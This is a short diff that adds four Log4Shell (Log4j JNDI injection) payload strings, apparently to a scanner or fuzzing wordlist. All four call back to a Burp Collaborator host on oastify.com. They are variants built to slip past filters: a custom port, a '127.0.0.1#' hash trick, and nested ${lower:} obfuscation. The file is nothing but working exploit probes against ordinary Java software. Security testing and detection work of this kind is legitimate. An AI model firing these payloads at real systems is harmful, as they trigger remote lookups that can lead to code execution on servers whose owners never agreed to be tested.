@@ -1,0 +1,4 @@
+${jndi:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/u_path}
+${jndi:ldap://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com:1389/u_port}
+${jndi:ldap://127.0.0.1#2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/u_hash}
+${jndi:${lower:l}da${lower:p}://2adstbwwcxnlzof89msbaju84zaqyjq7f.oastify.com/u_nested2}
